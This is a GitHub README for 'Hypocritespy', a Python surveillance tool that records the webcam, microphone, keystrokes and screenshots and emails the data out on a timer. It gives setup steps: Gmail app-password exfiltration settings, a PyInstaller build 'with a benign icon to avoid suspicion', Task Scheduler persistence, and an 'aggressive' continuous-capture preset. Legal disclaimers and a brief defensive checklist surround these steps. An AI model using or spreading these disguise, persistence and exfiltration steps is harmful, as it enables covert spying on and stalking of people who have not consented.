# Mugabo Rongin 👋

![Profile Image](https://github.com/Ronny12345-art/Hypocritespy/blob/main/mugabo-rongin-cybersecurity.png)
🔴 Hypocritespy

A Python-Based Surveillance Utility
Built with ❤️, ☕, and controlled chaos by Ronny Rogers (Mugabo Rongin)

⚠️ Important Notice

Hypocritespy is intended for LEGITIMATE SECURITY TESTING ONLY on devices you own or have explicit permission to monitor. Unauthorized use is illegal and violates privacy laws worldwide.

🎯 Overview

Hypocritespy captures system activity via multiple vectors to help with security research and testing:

🎥 Webcam Recording – Captures video from the default camera

🎤 Microphone Recording – Records ambient audio

⌨️ Keylogging – Tracks all keyboard inputs

🖼️ Screenshots – Takes periodic screen captures

Default Behavior:
Records for 10 minutes every 3 hours, emails collected data, then repeats.

🛠️ Quick Setup

Configure the Script
Edit these four values in the code:

YOUR_EMAIL = "your_email@gmail.com"            # Your email address
APP_PASSWORD = "your_app_specific_password"    # App password (not your normal email password)
RECIPIENT = "receiver@gmail.com"                # Email to receive data
RECORD_DURATION = 600                           # Recording duration in seconds (default 10 minutes)
INTERVAL = 10800                               # Interval between sessions in seconds (default 3 hours)


Build the Executable
Use PyInstaller with a benign icon to avoid suspicion:

pyinstaller --onefile --windowed --icon=calculator.ico main.py


Enable Startup Execution
For persistence, configure Windows Task Scheduler to run the executable at startup or logon.

🎨 Customization

Timing Presets:

# Quick monitoring: 1 minute every hour
RECORD_DURATION = 60
INTERVAL = 3600

# Aggressive monitoring: continuous
RECORD_DURATION = 86400   # 24 hours
INTERVAL = 1             # Immediate repeat


Feature Toggles: Enable or disable specific modules in the configuration as needed.

⚠️ Critical Notes

Antivirus software will flag this as malware due to its nature.

Always use app-specific passwords instead of your primary email password.

Test only in isolated virtual machines or controlled environments.

Verify and comply with local laws before deployment.

Always obtain written consent when monitoring others.

🛡️ Protection Against Unauthorized Surveillance

To defend your system from tools like Hypocritespy:

Use reputable antivirus and anti-malware software

Regularly audit startup programs and scheduled tasks

Monitor outgoing network connections

Use physical webcam covers when not in use

📚 Legitimate Use Cases

Parental control (with informed consent)

Employee monitoring (with written consent and legal compliance)

Personal device security research

Authorized penetration testing

Educational cybersecurity studies

🚫 Prohibited Uses

Monitoring without explicit consent

Spying on friends, family, or partners

Corporate espionage

Any unauthorized surveillance

⚖️ Legal Disclaimer

By using this software, you agree that:

You will use it only for legal and ethical purposes

You accept full responsibility for your actions

The developer holds no liability for misuse

You understand the legal consequences of unauthorized use

📞 More Information

For educational inquiries only:
https://ronny12345-art.github.io/ronnyrogers.dev/

👤 About the Author

Ronny Rogers
💻 Developer | 🛡️ Cybersecurity Specialist | ⚡ Pentester

Developer's Website: https://temp-wgktoqotyspoddhwlaln.webadorsite.com/?_gl=1*7vsbd1*_gcl_au*MTczNzc2NDMwMC4xNzY4NjQwODQxLjEzNjc2OTI1MDguMTc2ODY0MDk3MC4xNzY4NjQwOTY5*_ga*MjAyNzI3NjcyMS4xNzY4NjQwNzk2*_ga_E6PZPGE4QM*czE3Njg2NDA3OTQkbzEkZzEkdDE3Njg2NDM5NDkkajYwJGwwJGgyMDMzMTI1NTUz

Purpose: To facilitate learning about surveillance detection
Goal: Improve defensive security measures
Ethics: Privacy and consent always come first

🔐 Final Reminder

True cybersecurity power comes from protection, not intrusion. Use this knowledge responsibly to build stronger defenses—not to breach privacy.

Version: 1.0 | For Educational Purposes Only | Use Responsibly
